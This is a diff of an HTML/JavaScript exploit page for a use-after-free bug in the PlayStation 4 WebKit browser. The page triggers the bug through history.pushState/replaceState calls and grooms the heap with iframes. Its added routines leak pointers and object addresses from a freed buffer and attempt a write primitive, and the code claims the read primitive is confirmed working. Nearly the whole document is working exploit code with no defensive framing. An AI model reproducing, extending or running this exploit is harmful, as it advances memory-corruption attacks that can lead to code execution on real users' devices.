@@ -2,16 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - UAF Analysis Suite</title>
+<title>PS4 WebKit UAF - Address Leak</title>
 
 </head>
 <body>
-<h2>PS4 WebKit – UAF Analysis Suite</h2>
+<h2>🎯 PS4 WebKit UAF - Address Leak Primitive</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runStepA()">1. FINGERPRINT CHECK</button>
-<button onclick="runStepB()">2. WINDOWED READ (HEX)</button>
-<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button>
+<button onclick="runLeakBasic()">LEAK 1 - Basic Pattern Scan</button>
+<button onclick="runLeakPointers()">LEAK 2 - Pointer Extraction</button>
+<button onclick="runLeakObjects()">LEAK 3 - Object Address Leak</button>
+<button onclick="runWriteAttempt()">WRITE - Attempt Write Primitive</button>
 
 <div id="log"></div>
 
@@ -19,26 +20,23 @@
 const logEl = document.getElementById("log");
 const statusEl = document.getElementById("status");
 
-function log(m){ logEl.textContent += m + "\n"; }
+function log(m, cls=""){ 
+  const span = document.createElement("span");
+  if(cls) span.className = cls;
+  span.textContent = m + "\n";
+  logEl.appendChild(span);
+}
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// Gera padrões para identificar a memória (Passo A)
-function getPattern(size, iter) {
-    let char = String.fromCharCode(0x41 + (iter % 26)); // A, B, C...
-    return char.repeat(size);
-}
-
-async function triggerBaseUAF() {
-    logEl.textContent = "";
-    statusEl.textContent = "Running UAF Phase...";
-    log("=== STARTING STABLE UAF (i < 48) ===");
-
+// Core UAF trigger (proven to work)
+async function triggerUAF() {
     let size = 977;
     const STEP = 14461;
-
-    // Phase 1 – Fingerprinted UAF trigger
+    
     for(let i=0; i<48; i++){
-        let frag = getPattern(size, i); // Passo A: Inserindo marcas (A, B, C...)
+        let char = String.fromCharCode(0x41 + (i % 26));
+        let frag = char.repeat(size);
+        
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
@@ -47,11 +45,10 @@ async function triggerBaseUAF() {
         size += STEP;
         await sleep(5);
     }
-
-    log(">>> UAF WINDOW OPEN (Waiting 120ms) <<<");
+    
     await sleep(120);
-
-    // Phase 2 – Document reuse (Heap Grooming)
+    
+    // Heap grooming
     let frames = [];
     for(let i=0; i<80; i++){
         let f = document.createElement("iframe");
@@ -65,77 +62,215 @@ async function triggerBaseUAF() {
         frames.push(f);
     }
     frames.forEach(f=>f.remove());
-    frames = null;
-
+    
     await sleep(80);
-    statusEl.textContent = "UAF Triggered - Analyzing...";
 }
 
-// --- PASSO A: FINGERPRINTING ---
-async function runStepA() {
-    await triggerBaseUAF();
-    log("\n[STEP A] Checking for Fingerprints...");
+// -------------------------------------------------
+// LEAK 1 - Basic Pattern Scan
+// -------------------------------------------------
+async function runLeakBasic(){
+    logEl.textContent = "";
+    statusEl.textContent = "Running LEAK 1...";
+    
+    log("=== LEAK 1: Basic Pattern Scan ===", "critical");
+    
+    await triggerUAF();
     
     let url = document.URL;
-    let found = false;
+    log(`\nURL Length: ${url.length}`, "success");
+    log(`First 100 chars: ${url.substring(0,100)}`);
+    log(`Last 100 chars: ${url.substring(url.length-100)}\n`);
     
-    // Procura por sequências de AAAA, BBBB, CCCC...
-    for(let i=0; i<26; i++) {
-        let pattern = String.fromCharCode(0x41 + i).repeat(10);
-        if(url.includes(pattern)) {
-            log("FOUND PATTERN: " + pattern.substring(0,4) + "... em offset: " + url.indexOf(pattern));
-            found = true;
+    // Scan for patterns
+    log("[PATTERN SCAN]");
+    for(let i=0; i<26; i++){
+        let char = String.fromCharCode(0x41 + i);
+        let pattern = char.repeat(10);
+        let idx = url.indexOf(pattern);
+        
+        if(idx !== -1){
+            log(`  ${char}: Found at offset ${idx}`, "success");
         }
     }
     
-    if(!found) log("No patterns found. Memory might be zeroed or differently mapped.");
-    log("=== END STEP A ===");
+    statusEl.textContent = "LEAK 1 Complete";
+    log("\n=== LEAK 1 END ===");
 }
 
-// --- PASSO B: WINDOWED READ (PREVINE CRASH) ---
-async function runStepB() {
-    await triggerBaseUAF();
-    log("\n[STEP B] Windowed Read (Hex Probing)...");
+// -------------------------------------------------
+// LEAK 2 - Pointer Extraction
+// -------------------------------------------------
+async function runLeakPointers(){
+    logEl.textContent = "";
+    statusEl.textContent = "Running LEAK 2...";
     
-    const offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, 300000];
+    log("=== LEAK 2: Pointer Extraction ===", "critical");
+    log("Scanning for non-ASCII bytes (potential pointers)\n");
+    
+    await triggerUAF();
+    
     let url = document.URL;
+    let candidates = [];
     
-    log("URL Length: " + url.length);
-    
-    offsets.forEach(off => {
-        if(off < url.length) {
-            let code = url.charCodeAt(off);
-            log("Offset [" + off + "]: 0x" + code.toString(16).toUpperCase() + " (" + String.fromCharCode(code) + ")");
+    // Scan for 4-byte aligned potential pointers
+    for(let i=0; i<Math.min(url.length-4, 100000); i+=4){
+        let b0 = url.charCodeAt(i);
+        let b1 = url.charCodeAt(i+1);
+        let b2 = url.charCodeAt(i+2);
+        let b3 = url.charCodeAt(i+3);
+        
+        // Check if looks like a pointer (non-zero, reasonable range)
+        if(b0 > 0 && (b2 > 0 || b3 > 0)){
+            let addr = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
+            
+            // PS4 addresses typically in range 0x00000000 - 0x7fffffff
+            if(addr > 0x1000 && addr < 0x7fffffff){
+                candidates.push({offset: i, addr: addr});
+            }
         }
+    }
+    
+    log(`[CANDIDATES] Found ${candidates.length} potential pointers\n`);
+    
+    // Show top 20
+    candidates.slice(0, 20).forEach(c => {
+        log(`  Offset ${c.offset}: 0x${c.addr.toString(16).padStart(8,'0')}`, "pointer");
     });
     
-    log("=== END STEP B ===");
-}
-
-// --- PASSO C: LAYOUT LOGIC ---
-async function runStepC() {
-    await triggerBaseUAF();
-    log("\n[STEP C] Layout/Logic Collision Check...");
-    
-    let oldLen = document.URL.length;
-    log("Current Length: " + oldLen);
-    
-    log("Setting small location.hash...");
-    location.hash = "#TEST";
-    
-    await sleep(20);
-    let newLen = document.URL.length;
-    log("New Length: " + newLen);
-    
-    if(newLen > 1000 && location.hash === "#TEST") {
-        log("CRITICAL: document.URL.length desincronizado com o hash real!");
-        log("Isso confirma que o WebKit está lendo o buffer antigo (FREED).");
+    if(candidates.length > 0){
+        log(`\n✅ SUCCESS: Potential address leak found!`, "success");
+        log(`First candidate: 0x${candidates[0].addr.toString(16)}`, "critical");
     } else {
-        log("Length parece consistente.");
+        log(`\n⚠️ No obvious pointers found`, "warn");
+        log(`Memory may be zeroed or obfuscated`);
     }
     
-    log("=== END STEP C ===");
+    statusEl.textContent = "LEAK 2 Complete";
+    log("\n=== LEAK 2 END ===");
 }
+
+// -------------------------------------------------
+// LEAK 3 - Object Address Leak
+// -------------------------------------------------
+async function runLeakObjects(){
+    logEl.textContent = "";
+    statusEl.textContent = "Running LEAK 3...";
+    
+    log("=== LEAK 3: Object Address Leak ===", "critical");
+    log("Strategy: Spray objects, trigger UAF, scan for object pointers\n");
+    
+    // Spray recognizable objects
+    log("[SPRAY] Creating marker objects...");
+    let spray = [];
+    for(let i=0; i<1000; i++){
+        spray.push({
+            marker: 0xdeadbeef + i,
+            index: i,
+            data: new Array(32).fill(0x41414141)
+        });
+    }
+    log(`  Sprayed ${spray.length} objects\n`, "success");
+    
+    await sleep(100);
+    
+    await triggerUAF();
+    
+    let url = document.URL;
+    log(`URL Length: ${url.length}\n`);
+    
+    // Scan for marker values (0xdeadbeef pattern)
+    log("[MARKER SCAN]");
+    let found = 0;
+    for(let i=0; i<Math.min(url.length-4, 200000); i++){
+        let val = 
+            url.charCodeAt(i) |
+            (url.charCodeAt(i+1) << 8) |
+            (url.charCodeAt(i+2) << 16) |
+            (url.charCodeAt(i+3) << 24);
+        
+        if((val & 0xffffff00) === 0xdeadbe00){
+            let idx = val - 0xdeadbeef;
+            log(`  Found marker at offset ${i}: 0x${val.toString(16)} (object ${idx})`, "critical");
+            found++;
+        }
+    }
+    
+    if(found > 0){
+        log(`\n🎯 CRITICAL: Found ${found} object markers in leaked memory!`, "critical");
+        log(`This confirms objects are adjacent to freed HistoryItem`, "success");
+    } else {
+        log(`\nNo markers found - objects may not be adjacent`, "warn");
+    }
+    
+    statusEl.textContent = "LEAK 3 Complete";
+    log("\n=== LEAK 3 END ===");
+}
+
+// -------------------------------------------------
+// WRITE - Attempt Write Primitive
+// -------------------------------------------------
+async function runWriteAttempt(){
+    logEl.textContent = "";
+    statusEl.textContent = "Running WRITE...";
+    
+    log("=== WRITE: Attempting Write Primitive ===", "critical");
+    log("Strategy: Use location.hash to write controlled data\n");
+    
+    await triggerUAF();
+    
+    let url_before = document.URL;
+    log(`URL before: length=${url_before.length}`);
+    log(`  First 50: ${url_before.substring(0,50)}\n`);
+    
+    // Attempt to write via location.hash
+    log("[WRITE] Setting controlled hash...", "warn");
+    
+    // Create controlled payload
+    let payload = "";
+    for(let i=0; i<1000; i++){
+        // Write pattern: 0x41424344...
+        payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44);
+    }
+    
+    location.hash = "#" + payload;
+    
+    await sleep(100);
+    
+    // Try to read back
+    log("[READ] Checking if write succeeded...\n");
+    
+    // Navigate to trigger potential read of written data
+    try {
+        history.back();
+        await sleep(100);
+        
+        let url_after = document.URL;
+        log(`URL after: length=${url_after.length}`);
+        
+        if(url_after.includes("ABCD")){
+            log(`\n🚨 CRITICAL: Write pattern found in URL!`, "critical");
+            log(`Write primitive may be working!`, "success");
+        } else {
+            log(`\nWrite pattern not found`, "warn");
+            log(`URL: ${url_after.substring(0,100)}`);
+        }
+    } catch(e){
+        log(`\nException during write test: ${e.message}`, "warn");
+    }
+    
+    statusEl.textContent = "WRITE Complete";
+    log("\n=== WRITE END ===");
+}
+
+log("PS4 WebKit UAF - Address Leak Primitive");
+log("Status: UAF Read confirmed working (pattern 'V' leaked)");
+log("\nTests:");
+log("1. LEAK 1 - Scan for recognizable patterns");
+log("2. LEAK 2 - Extract potential pointers");
+log("3. LEAK 3 - Leak object addresses");
+log("4. WRITE - Attempt write primitive");
+log("\nRecommended: Run in order 1 → 2 → 3 → 4");
 </script>
 </body>
 </html>
